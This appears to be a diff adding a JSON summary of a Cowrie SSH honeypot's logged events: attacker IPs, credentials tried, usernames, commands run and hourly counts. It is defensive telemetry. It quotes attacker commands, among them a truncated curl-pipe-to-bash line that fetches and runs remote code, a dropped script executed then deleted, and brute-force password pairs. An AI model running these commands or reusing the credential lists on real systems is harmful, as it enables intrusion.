@@ -1,0 +1,243 @@
+{
+ "generated_from": "honeypot-01 (Cowrie sensor, 92.5.188.26)",
+ "totals": {
+  "events": 1858,
+  "distinct_ips": 12
+ },
+ "by_kind": [
+  {
+   "kind": "cowrie_command",
+   "n": 507
+  },
+  {
+   "kind": "cowrie_connect",
+   "n": 457
+  },
+  {
+   "kind": "cowrie_session",
+   "n": 456
+  },
+  {
+   "kind": "cowrie_login_success",
+   "n": 435
+  },
+  {
+   "kind": "cowrie_login_failed",
+   "n": 3
+  }
+ ],
+ "top_ips": [
+  {
+   "ip": "109.160.32.176",
+   "n": 1656
+  },
+  {
+   "ip": "193.32.162.84",
+   "n": 126
+  },
+  {
+   "ip": "161.33.14.212",
+   "n": 22
+  },
+  {
+   "ip": "213.35.98.222",
+   "n": 22
+  },
+  {
+   "ip": "103.136.212.48",
+   "n": 4
+  },
+  {
+   "ip": "127.0.0.1",
+   "n": 4
+  },
+  {
+   "ip": "165.50.87.246",
+   "n": 4
+  },
+  {
+   "ip": "190.114.118.179",
+   "n": 4
+  },
+  {
+   "ip": "213.230.87.43",
+   "n": 4
+  },
+  {
+   "ip": "5.180.100.157",
+   "n": 4
+  },
+  {
+   "ip": "64.23.140.96",
+   "n": 4
+  },
+  {
+   "ip": "78.104.125.223",
+   "n": 4
+  }
+ ],
+ "top_credentials": [
+  {
+   "cred": "root/LeitboGi0ro",
+   "n": 7
+  },
+  {
+   "cred": "root/admin123",
+   "n": 2
+  },
+  {
+   "cred": "root/admin",
+   "n": 2
+  },
+  {
+   "cred": "root/123@@@",
+   "n": 2
+  },
+  {
+   "cred": "root/123456",
+   "n": 2
+  },
+  {
+   "cred": "root/12345",
+   "n": 2
+  },
+  {
+   "cred": "root/1234",
+   "n": 2
+  },
+  {
+   "cred": "root/111111",
+   "n": 2
+  },
+  {
+   "cred": "zq/zqzq",
+   "n": 1
+  },
+  {
+   "cred": "zlm/123456",
+   "n": 1
+  },
+  {
+   "cred": "zahra/12345678",
+   "n": 1
+  },
+  {
+   "cred": "zabbix/zabbix",
+   "n": 1
+  },
+  {
+   "cred": "ymy/1",
+   "n": 1
+  },
+  {
+   "cred": "www/www",
+   "n": 1
+  },
+  {
+   "cred": "wso2/wso2",
+   "n": 1
+  }
+ ],
+ "top_usernames": [
+  {
+   "username": "root",
+   "n": 184
+  },
+  {
+   "username": "admin",
+   "n": 14
+  },
+  {
+   "username": "ubuntu",
+   "n": 12
+  },
+  {
+   "username": "deploy",
+   "n": 9
+  },
+  {
+   "username": "user",
+   "n": 8
+  },
+  {
+   "username": "test",
+   "n": 6
+  },
+  {
+   "username": "user1",
+   "n": 4
+  },
+  {
+   "username": "developer",
+   "n": 4
+  },
+  {
+   "username": "myuser",
+   "n": 3
+  },
+  {
+   "username": "guest",
+   "n": 3
+  },
+  {
+   "username": "fastuser",
+   "n": 3
+  },
+  {
+   "username": "dev",
+   "n": 3
+  }
+ ],
+ "top_commands": [
+  {
+   "cmd": "uname -s -v -n -r -m",
+   "n": 412
+  },
+  {
+   "cmd": "printf \"#!/bin/bash\\necho \\\"xxxxxx\\\"\\n\" > filter && chmod +x filter && ./filter ",
+   "n": 30
+  },
+  {
+   "cmd": "#!/bin/bash\necho \"xxxxxx\"\n",
+   "n": 30
+  },
+  {
+   "cmd": "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nu",
+   "n": 15
+  },
+  {
+   "cmd": "rm /tmp/bendi.py",
+   "n": 4
+  },
+  {
+   "cmd": "python3 /tmp/bendi.py",
+   "n": 4
+  },
+  {
+   "cmd": "if ! command -v curl &> /dev/null; then apt-get update -y && apt-get install -y ",
+   "n": 4
+  },
+  {
+   "cmd": "command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y p",
+   "n": 4
+  },
+  {
+   "cmd": "bash <(curl -sL https://raw.githubusercontent.com/komari-monitor/komari-agent/re",
+   "n": 4
+  }
+ ],
+ "by_hour": [
+  {
+   "hour": "2026-09-27T19",
+   "n": 42
+  },
+  {
+   "hour": "2026-09-27T20",
+   "n": 1606
+  },
+  {
+   "hour": "2026-09-27T21",
+   "n": 210
+  }
+ ]
+}
